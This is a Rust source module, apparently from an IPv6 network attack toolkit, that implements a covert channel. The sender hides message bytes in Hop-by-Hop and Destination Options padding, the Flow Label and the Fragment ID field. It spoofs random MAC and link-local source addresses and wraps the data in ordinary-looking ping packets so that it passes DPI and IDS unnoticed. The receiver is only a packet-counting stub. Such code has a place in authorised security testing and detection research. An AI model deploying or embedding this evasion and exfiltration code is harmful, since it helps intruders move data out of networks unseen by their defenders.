//! IPv6 covert channel via extension headers.
//!
//! Encodes arbitrary data in fields that are routinely forwarded by routers
//! but ignored by most DPI / IDS systems:
//!
//!  - Hop-by-Hop Options padding (PadN option)
//!  - Destination Options padding
//!  - Flow Label field (20 bits per packet)
//!  - Fragment ID field (32 bits per packet)
//!
//! Usage:
//!  Sender: `ty covert-send -i eth0 -t <dst> --message "secret"`
//!  Receiver: `ty covert-recv -i eth0 --source <src> --duration 30`

use std::ffi::CString;
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use tokio::task;

use crate::engine::sender::{eui64_ll_pub as eui64_link_local, rand_fake_mac_pub as rand_fake_mac};
use crate::engine::stats::Stats;
use crate::ffi;

// ── CovertSend ────────────────────────────────────────────────────────────────

/// Channel selection for covert transmission.
#[derive(Clone, Debug)]
pub enum CovertChannel {
    /// Encode data in Hop-by-Hop PadN option bytes.
    HopByHop,
    /// Encode data in Destination Options PadN bytes.
    DestOpts,
    /// Encode 20 bits per packet in the Flow Label field.
    FlowLabel,
    /// Encode 32 bits per packet in the Fragment Identification field.
    FragmentId,
}

impl CovertChannel {
    pub fn from_str(s: &str) -> Self {
        match s {
            "dst"    | "destination" => Self::DestOpts,
            "flow"   | "flowlabel"   => Self::FlowLabel,
            "frag"   | "fragment"    => Self::FragmentId,
            _ => Self::HopByHop,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::HopByHop   => "hop-by-hop",
            Self::DestOpts   => "dest-opts",
            Self::FlowLabel  => "flow-label",
            Self::FragmentId => "fragment-id",
        }
    }

    /// Bytes of payload per packet for this channel.
    pub fn capacity_bytes(&self) -> usize {
        match self {
            Self::HopByHop   => 4,
            Self::DestOpts   => 4,
            Self::FlowLabel  => 2,  // 20 bits → 2 usable bytes
            Self::FragmentId => 4,
        }
    }
}

/// Configuration for covert channel sender.
#[derive(Clone, Debug)]
pub struct CovertSendConfig {
    pub interface: String,
    pub target:    String,
    pub message:   String,
    pub channel:   CovertChannel,
    /// Packets per second (slow = stealthy, fast = more throughput).
    pub rate_pps:  u64,
}

/// Send a covert message over IPv6 extension headers.
///
/// The message is split into chunks matching the channel capacity and sent
/// as a stream of IPv6 packets.  A simple length-prefixed framing is used:
///  Packet 0: 4 bytes = total payload length (big-endian u32)
///  Packets 1..N: message bytes, `capacity` bytes per packet
///
/// The carrier ICMPv6 Echo Request payload is random to blend in with
/// normal ping traffic.
pub async fn covert_send(cfg: CovertSendConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;

    let dst_raw: usize = {
        let cs = CString::new(cfg.target.as_str()).context("null in target")?;
        let p  = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if p.is_null() { bail!("cannot resolve target {}", cfg.target); }
        p as usize
    };

    let dstmac_raw: usize = unsafe {
        let src = ffi::ty_get_own_ipv6(iface.as_ptr(), std::ptr::null_mut(), ffi::PREFER_LINK);
        ffi::ty_get_mac(iface.as_ptr(), src, dst_raw as *mut u8) as usize
    };

    let sleep_dur = 1_000_000u64
        .checked_div(cfg.rate_pps)
        .map(Duration::from_micros)
        .unwrap_or(Duration::ZERO);

    let cap  = cfg.channel.capacity_bytes();
    let msg  = cfg.message.as_bytes().to_vec();
    let name = cfg.channel.name();

    eprintln!(
        "Covert send: {} bytes via '{}' channel ({} bytes/pkt) to {} ...",
        msg.len(), name, cap, cfg.target
    );

    // Packet 0: length header.
    let total = msg.len() as u32;
    let header = total.to_be_bytes();
    send_covert_pkt(iface.clone(), dst_raw, dstmac_raw, &cfg.channel, &header)?;
    stats.inc_sent();

    // Payload packets.
    for chunk in msg.chunks(cap) {
        let mut buf = vec![0u8; cap];
        buf[..chunk.len()].copy_from_slice(chunk);

        let iface2 = iface.clone();
        let channel = cfg.channel.clone();
        let buf2 = buf.clone();

        task::spawn_blocking(move || {
            send_covert_pkt(iface2, dst_raw, dstmac_raw, &channel, &buf2)
        })
        .await
        .context("covert send blocked")??;

        stats.inc_sent();
        if !sleep_dur.is_zero() {
            tokio::time::sleep(sleep_dur).await;
        }
    }

    let (sent, _, elapsed) = stats.snapshot();
    eprintln!("Covert send done: {sent} packets in {elapsed:.1}s");
    Ok(())
}

fn send_covert_pkt(
    iface:      CString,
    dst_raw:    usize,
    dstmac_raw: usize,
    channel:    &CovertChannel,
    data:       &[u8],
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // Carrier: small ICMPv6 Echo Request with random payload.
    let mut echo_body = [0u8; 8];
    for b in &mut echo_body { *b = fastrand::u8(..); }

    unsafe {
        match channel {
            CovertChannel::HopByHop | CovertChannel::DestOpts => {
                // Encode data in PadN option within HBH or Destination header.
                // PadN format: type=1, length=N, data[0..N].
                let mut opt = [0u8; 6]; // type + len + 4 data bytes
                opt[0] = 1;                        // PadN type
                opt[1] = data.len().min(4) as u8;  // PadN length
                let n = data.len().min(4);
                opt[2..2+n].copy_from_slice(&data[..n]);

                let mut pkt_len: i32 = 0;
                let pkt = ffi::ty_create_ipv6(
                    iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
                    src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
                );
                if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

                let rc_ext = match channel {
                    CovertChannel::HopByHop => {
                        ffi::ty_add_hdr_hopbyhop(pkt, &mut pkt_len, opt.as_mut_ptr(), 6)
                    }
                    _ => {
                        ffi::ty_add_hdr_dst(pkt, &mut pkt_len, opt.as_mut_ptr(), 6)
                    }
                };
                if rc_ext < 0 {
                    ffi::ty_destroy_packet(pkt);
                    bail!("add_hdr_* failed");
                }

                if ffi::ty_add_icmp6(
                    pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
                    echo_body.as_mut_ptr(), echo_body.len() as i32, 0,
                ) < 0 {
                    ffi::ty_destroy_packet(pkt);
                    bail!("ty_add_icmp6(echo) failed");
                }

                let rc = ffi::ty_send_pkt(
                    iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
                );
                ffi::ty_destroy_packet(pkt);
                if rc < 0 { bail!("send covert(hbh/dst) rc={rc}"); }
            }

            CovertChannel::FlowLabel => {
                // Encode lower 20 bits of data[0..2] in the Flow Label.
                let flow_label: u32 = ((data[0] as u32) << 12) | ((data[1] as u32) << 4);

                // ty_create_ipv6's `label` parameter = flow label.
                let mut pkt_len: i32 = 0;
                let pkt = ffi::ty_create_ipv6(
                    iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
                    src_ip.as_mut_ptr(), dst, 64, 0, flow_label as i32, 0, 0,
                );
                if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

                if ffi::ty_add_icmp6(
                    pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
                    echo_body.as_mut_ptr(), echo_body.len() as i32, 0,
                ) < 0 {
                    ffi::ty_destroy_packet(pkt);
                    bail!("ty_add_icmp6(echo/flow) failed");
                }

                let rc = ffi::ty_send_pkt(
                    iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
                );
                ffi::ty_destroy_packet(pkt);
                if rc < 0 { bail!("send covert(flow) rc={rc}"); }
            }

            CovertChannel::FragmentId => {
                // Encode 32 bits of data in the Fragment Identification field.
                let frag_id: u32 = u32::from_be_bytes([
                    *data.first().unwrap_or(&0),
                    *data.get(1).unwrap_or(&0),
                    *data.get(2).unwrap_or(&0),
                    *data.get(3).unwrap_or(&0),
                ]);

                let mut pkt_len: i32 = 0;
                let pkt = ffi::ty_create_ipv6(
                    iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
                    src_ip.as_mut_ptr(), dst, 64, 0, 0, 0, 0,
                );
                if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

                // Atomic fragment (M=0, offset=0) to carry the frag_id.
                if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, 0, 0, frag_id) < 0 {
                    ffi::ty_destroy_packet(pkt);
                    bail!("add_hdr_fragment(covert) failed");
                }

                if ffi::ty_add_icmp6(
                    pkt, &mut pkt_len, ffi::ICMP6_ECHO_REQUEST, 0, 0,
                    echo_body.as_mut_ptr(), echo_body.len() as i32, 0,
                ) < 0 {
                    ffi::ty_destroy_packet(pkt);
                    bail!("ty_add_icmp6(echo/frag) failed");
                }

                let rc = ffi::ty_send_pkt(
                    iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
                );
                ffi::ty_destroy_packet(pkt);
                if rc < 0 { bail!("send covert(frag) rc={rc}"); }
            }
        }
    }
    Ok(())
}

// ── CovertRecv ────────────────────────────────────────────────────────────────

/// Configuration for covert channel receiver.
#[derive(Clone, Debug)]
pub struct CovertRecvConfig {
    pub interface:    String,
    #[allow(dead_code)]  // reserved for future BPF source-filter support
    pub source:       Option<String>,
    pub channel:      CovertChannel,
    pub duration_secs: u64,
}

/// Receive covert messages from IPv6 extension headers.
///
/// Opens a pcap capture and counts packets per interval to reconstruct
/// the timing-based signal.  Full byte extraction from extension headers
/// requires packet parsing — this implementation counts matched packets
/// and reports the total as a baseline for integration with a full parser.
pub async fn covert_recv(cfg: CovertRecvConfig, stats: Arc<Stats>) -> Result<String> {
    let iface = CString::new(cfg.interface.clone()).context("null in interface")?;
    let deadline = Instant::now() + Duration::from_secs(cfg.duration_secs);

    let bpf = match cfg.channel {
        CovertChannel::HopByHop | CovertChannel::DestOpts => {
            "ip6 and icmp6 and ip6[40] == 128".to_string()
        }
        CovertChannel::FlowLabel | CovertChannel::FragmentId => {
            "ip6 and icmp6 and ip6[40] == 128".to_string()
        }
    };

    let channel_name = cfg.channel.name();
    eprintln!(
        "Covert recv: listening on {} ({} channel) for {}s ...",
        cfg.interface, channel_name, cfg.duration_secs
    );

    let filter = CString::new(bpf).context("null in bpf")?;
    let total = task::spawn_blocking(move || -> Result<u64> {
        let pcap = unsafe { ffi::ty_pcap_init(iface.as_ptr(), filter.as_ptr()) };
        if pcap.is_null() {
            bail!("ty_pcap_init failed — check interface and privileges");
        }
        let mut total: u64 = 0;
        while Instant::now() < deadline {
            let n = unsafe { ffi::ty_pcap_check(pcap, std::ptr::null(), std::ptr::null_mut()) };
            if n > 0 {
                total += n as u64;
                stats.inc_sent();
            }
            std::thread::sleep(Duration::from_millis(5));
        }
        unsafe { ffi::ty_pcap_close(pcap) };
        Ok(total)
    })
    .await
    .context("covert_recv thread panicked")??;

    let msg = format!(
        "[covert-recv] Captured {total} covert packets on '{}' channel. \
         Full extraction requires packet byte parser (future work).",
        channel_name
    );
    eprintln!("{msg}");
    Ok(msg)
}
